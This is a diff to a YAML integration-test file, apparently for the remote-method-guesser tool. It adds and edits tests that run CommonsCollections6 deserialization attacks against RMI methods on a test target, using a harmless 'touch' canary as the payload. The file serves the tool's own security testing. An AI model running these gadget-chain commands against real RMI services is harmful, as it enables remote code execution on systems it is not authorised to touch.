@@ -1,30 +1,3 @@
-tester:
-  title: Method Tests
-  description: |-
-    'Perform tests for the serial action on custom RMI endpoints.'
-
-  id: '002-009'
-  groups:
-    - method
-    - plugin
-    - serial
-  id_pattern: '002-009-{:03}'
-
-
-variables:
-  file: jdk9-method-rce-test.txt
-
-
-plugins:
-  - os_command:
-      cmd:
-        - /bin/bash
-        - ../../../plugins/build.sh
-        - ../../../target/${rmg}
-        - ../../utils/PluginTest.java
-        - ../../utils/PluginTest.jar
-
-
 tests:
   - title: Gadget Call
     description: |-
@@ -98,6 +71,7 @@ tests:
     description: |-
       'Performs a deserialization attack on the updatePreferences function of the'
       'activation-test2 object.'
+
     groups:
       - ysoserial
 
@@ -143,18 +117,55 @@ tests:
       - custom 
       - 'touch ${volume-d}/${file}'
       - --signature
-      - 'String execute(String dummy)'
+      - 'String login(java.util.HashMap dummy1)'
       - --bound-name
-      - plain-server
+      - legacy-service
       - --plugin
-      - ../../utils/PluginTest.jar
+      - ../utils/PluginTest.jar
       - ${OPTIONS}
 
     validators:
       - error: False
       - contains:
           values:
-            - java.lang.String
+            - java.util.HashMap
+            - Caught ClassNotFoundException
+            - deserialize canary
+            - probably worked
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
+
+
+  - title: Gadget Call (Legacy, non default SerialVersionUID)
+    description: |-
+      'Performs a deserialization attack on the releaseRecord function of the
+      legacy-service object and uses a non default SerialVersionUID for the
+      attack. rmg should autocorrect this.'
+
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+      - --signature
+      - 'void releaseRecord(int recordID, String tableName, Integer remoteHashCode)'
+      - --bound-name
+      - legacy-service
+      - --serial-version-uid
+      - 4444
+      - ${OPTIONS}
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - java.lang.Integer
             - Caught ClassNotFoundException
             - deserialize canary
             - probably worked
